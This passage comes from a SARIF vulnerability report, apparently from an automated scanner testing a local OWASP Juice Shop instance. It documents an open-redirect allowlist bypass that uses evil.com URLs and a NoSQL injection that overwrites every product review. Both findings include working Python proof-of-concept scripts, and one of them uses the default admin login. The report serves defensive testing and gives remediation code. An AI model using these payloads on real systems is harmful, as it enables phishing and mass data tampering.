          ],
          "properties": {
            "security-severity": "6.1",
            "strix": {
              "id": "vuln-0008",
              "severity": "medium",
              "cvss": 6.1,
              "timestamp": "2026-05-09 10:58:16 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/redirect",
              "method": "GET",
              "cwe": "CWE-601",
              "impact": "Successful exploitation enables:\n\n- Credential phishing: an attacker constructs a link on the trusted Juice Shop domain that redirects to an attacker-controlled look-alike page, harvesting user credentials\n- OAuth/session token theft: if combined with authentication flows that pass tokens in redirect URIs\n- Malware distribution: users trust the initial domain and follow the redirect to a malicious payload\n- Brand and trust erosion: the legitimate domain is used as a launchpad for attacks, damaging reputation\n\nThe vulnerability requires no authentication and can be exploited with a single crafted link sent to a victim.",
              "technical_analysis": "The vulnerability exists in the `isRedirectAllowed()` function in `lib/insecurity.ts` (lines 135-141):\n\n```typescript\nexport const isRedirectAllowed = (url: string) => {\n  let allowed = false\n  for (const allowedUrl of redirectAllowlist) {\n    allowed = allowed || url.includes(allowedUrl)\n  }\n  return allowed\n}\n```\n\nThe allowlist contains URLs such as `https://github.com/juice-shop/juice-shop`. The `includes()` method checks whether the allowed URL string appears anywhere within the user-supplied URL. This means an attacker-controlled URL like `https://evil.com/?https://github.com/juice-shop/juice-shop` passes validation because the allowed string is present as a query parameter.\n\nThe `performRedirect()` function in `routes/redirect.ts` then issues a direct `res.redirect(toUrl)` with the user-supplied URL, resulting in an HTTP 302 response with the attacker's URL in the Location header.\n\nConfirmed bypass patterns:\n- Query string embedding: `https://evil.com/?https://github.com/juice-shop/juice-shop` → 302 to evil.com\n- Path embedding: `http://evil.com/https://github.com/juice-shop/juice-shop` → 302 to evil.com\n- Subdomain embedding: `http://https://github.com/juice-shop/juice-shop.evil.com` → 302 to evil.com",
              "remediation_steps": "1. Replace the `includes()` substring check with strict URL parsing and exact origin comparison. Parse the user-supplied URL using the WHATWG URL constructor, then compare the resulting scheme and hostname against the allowlist:\n\n   ```typescript\n   export const isRedirectAllowed = (url: string) => {\n     try {\n       const parsed = new URL(url)\n       return redirectAllowlist.has(parsed.origin + parsed.pathname)\n     } catch {\n       return false\n     }\n   }\n   ```\n\n2. If path-level matching is required, compare the parsed URL's origin and pathname prefix against allowlisted entries rather than checking substring containment.\n\n3. Reject URLs with unexpected schemes (only allow `https://`).\n\n4. Consider removing the server-side redirect endpoint entirely and implementing client-side navigation with user-visible confirmation (\"You are being redirected to an external site...\").\n\n5. Add integration tests that verify bypass patterns (query embedding, path embedding, subdomain tricks) are blocked.",
              "poc": {
                "description": "To reproduce:\n\n1. Send a GET request to `/redirect?to=https://evil.com` and observe a 406 response (blocked by allowlist).\n2. Send a GET request to `/redirect?to=https://evil.com/?https://github.com/juice-shop/juice-shop` and observe a 302 redirect to the attacker-controlled URL.\n3. Verify the Location header contains the full attacker URL including the embedded allowlisted string.\n4. Test additional bypass patterns (path embedding, subdomain embedding) to confirm the root cause is the `includes()` check.",
                "script": "import requests\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\nprint(\"[*] Testing Open Redirect via Allowlist Bypass\")\nprint(\"=\" * 60)\n\n# Step 1: Confirm normal allowed redirect works\nallowed_url = \"https://github.com/juice-shop/juice-shop\"\nresp = requests.get(f\"{BASE_URL}/redirect?to={allowed_url}\", allow_redirects=False, timeout=10)\nprint(f\"[i] Allowed URL: HTTP {resp.status_code} -> {resp.headers.get('Location', 'N/A')}\")\n\n# Step 2: Confirm disallowed URL is blocked\nblocked_url = \"https://evil.com\"\nresp = requests.get(f\"{BASE_URL}/redirect?to={blocked_url}\", allow_redirects=False, timeout=10)\nprint(f\"[i] Blocked URL: HTTP {resp.status_code} (should be 406)\")\n\n# Step 3: Bypass via query parameter embedding\nbypass1 = \"https://evil.com/?https://github.com/juice-shop/juice-shop\"\nresp = requests.get(f\"{BASE_URL}/redirect?to={bypass1}\", allow_redirects=False, timeout=10)\nprint(f\"\\n[!] Bypass 1 (query param): HTTP {resp.status_code}\")\nprint(f\"    URL: {bypass1}\")\nprint(f\"    Location: {resp.headers.get('Location', 'N/A')}\")\nif resp.status_code == 302:\n    print(f\"    [CONFIRMED] Server redirects to attacker-controlled domain!\")\n\n# Step 4: Bypass via path embedding\nbypass2 = \"http://evil.com/https://github.com/juice-shop/juice-shop\"\nresp = requests.get(f\"{BASE_URL}/redirect?to={bypass2}\", allow_redirects=False, timeout=10)\nprint(f\"\\n[!] Bypass 2 (path embed): HTTP {resp.status_code}\")\nprint(f\"    URL: {bypass2}\")\nprint(f\"    Location: {resp.headers.get('Location', 'N/A')}\")\nif resp.status_code == 302:\n    print(f\"    [CONFIRMED] Path embedding bypass works!\")\n\n# Step 5: Bypass via subdomain-like pattern\nbypass3 = \"http://https://github.com/juice-shop/juice-shop.evil.com\"\nresp = requests.get(f\"{BASE_URL}/redirect?to={bypass3}\", allow_redirects=False, timeout=10)\nprint(f\"\\n[!] Bypass 3 (subdomain): HTTP {resp.status_code}\")\nprint(f\"    URL: {bypass3}\")\nprint(f\"    Location: {resp.headers.get('Location', 'N/A')}\")\nif resp.status_code == 302:\n    print(f\"    [CONFIRMED] Subdomain embedding bypass works!\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-943",
          "level": "warning",
          "message": {
            "text": "NoSQL Injection in Product Reviews Update Enables Mass Data Manipulation"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/updateProductReviews.ts"
                },
                "region": {
                  "startLine": 17,
                  "endLine": 20,
                  "snippet": {
                    "text": "db.reviewsCollection.update( // vuln-code-snippet neutral-line forgedReviewChallenge\n      { _id: req.body.id }, // vuln-code-snippet vuln-line noSqlReviewsChallenge forgedReviewChallenge\n      { $set: { message: req.body.message } },\n      { multi: true } // vuln-code-snippet vuln-line noSqlReviewsChallenge"
                  }
                }
              },
              "message": {
                "text": "User-controlled req.body.id passed directly as MongoDB query selector with multi:true"
              }
            }
          ],
          "properties": {
            "security-severity": "6.5",
            "strix": {
              "id": "vuln-0013",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-05-09 11:00:58 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/rest/products/reviews",
              "method": "PATCH",
              "cwe": "CWE-943",
              "impact": "An authenticated attacker can:\n\n- Modify the content of all product reviews simultaneously by injecting a MongoDB operator (e.g., `{\"$ne\": \"\"}`) as the document selector, which matches every document in the collection.\n- Deface all product reviews across the entire application, destroying user-generated content integrity.\n- Forge reviews by modifying the content of reviews authored by other users, since the author field is not re-validated on update.\n- Undermine the trust and integrity of the review system, which may influence purchasing decisions.\n\nDuring testing, a single PATCH request modified 31 review documents simultaneously, replacing all review messages with attacker-controlled content.",
              "technical_analysis": "The vulnerable code in `routes/updateProductReviews.ts` (lines 17-20) constructs a MongoDB update query by directly embedding the user-supplied `req.body.id` value as the document selector:\n\n```typescript\ndb.reviewsCollection.update(\n  { _id: req.body.id },\n  { $set: { message: req.body.message } },\n  { multi: true }\n)\n```\n\nWhen the `id` field contains a MongoDB query operator object such as `{\"$ne\": \"\"}` instead of a scalar string value, the query semantics change from \"update the document with this specific ID\" to \"update all documents whose ID is not empty\" — effectively selecting every document in the collection.\n\nThe `{ multi: true }` option compounds the severity by ensuring that all matched documents are updated rather than just the first match. Without this option, only one document would be affected even with an injected selector.\n\nThe endpoint requires authentication (Bearer token) but performs no authorization check to verify the requesting user owns the review being modified. This is a secondary broken access control issue layered atop the NoSQL injection.",
              "remediation_steps": "1. Validate the type of the `id` field before using it in a MongoDB query. Reject any value that is not a plain string to prevent operator injection:\n\n```typescript\nif (typeof req.body.id !== 'string') {\n  return res.status(400).json({ error: 'Invalid review ID format' });\n}\n```\n\n2. Remove the `{ multi: true }` option from the update call. A review update should only ever modify a single document. Use `updateOne()` instead of `update()` to make the single-document intent explicit.\n\n3. Implement authorization checks to verify that the authenticated user is the author of the review being modified.\n\n4. Apply input sanitization using a library such as `mongo-sanitize` to strip MongoDB operator keys (prefixed with `$`) from user-supplied input at the middleware level.",
              "poc": {
                "description": "To reproduce the vulnerability:\n\n1. Authenticate to the application by sending a POST request to `/rest/user/login` with valid credentials to obtain a JWT token.\n2. Send a PATCH request to `/rest/products/reviews` with the `id` field set to the MongoDB query operator object `{\"$ne\": \"\"}` and `message` set to arbitrary attacker-controlled content.\n3. Observe that the response indicates multiple documents were modified (the `modified` count equals 31, confirming all reviews were affected).\n4. Verify by querying product reviews via `GET /rest/products/1/reviews` that all review messages have been replaced with the attacker-supplied content.",
                "script": "import requests\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Step 1: Authenticate\nlogin_resp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"}\n)\ntoken = login_resp.json()[\"authentication\"][\"token\"]\nheaders = {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n\n# Step 2: Verify reviews exist before injection\nreviews_before = requests.get(f\"{BASE_URL}/rest/products/1/reviews\")\nprint(f\"Reviews before: {len(reviews_before.json()['data'])} reviews for product 1\")\nprint(f\"First review message: {reviews_before.json()['data'][0]['message'][:80]}\")\n\n# Step 3: Exploit NoSQL injection - modify ALL reviews\n# The {\"$ne\": \"\"} operator matches all documents where _id is not empty (all docs)\npayload = {\n    \"id\": {\"$ne\": \"\"},\n    \"message\": \"All reviews modified via NoSQL injection\"\n}\nexploit_resp = requests.patch(\n    f\"{BASE_URL}/rest/products/reviews\",\n    headers=headers,\n    json=payload\n)\nresult = exploit_resp.json()\nprint(f\"\\nExploit response status: {exploit_resp.status_code}\")\nprint(f\"Documents modified: {result.get('modified', 'N/A')}\")\nprint(f\"Original first doc author: {result.get('original', [{}])[0].get('author', 'N/A')}\")\n\n# Step 4: Verify mass modification\nreviews_after = requests.get(f\"{BASE_URL}/rest/products/1/reviews\")\nprint(f\"\\nReviews after injection:\")\nfor review in reviews_after.json()[\"data\"][:3]:\n    print(f\"  Author: {review['author']}, Message: {review['message'][:60]}\")"
              }
            }
          }
        }
      ]
    }
  ]
}
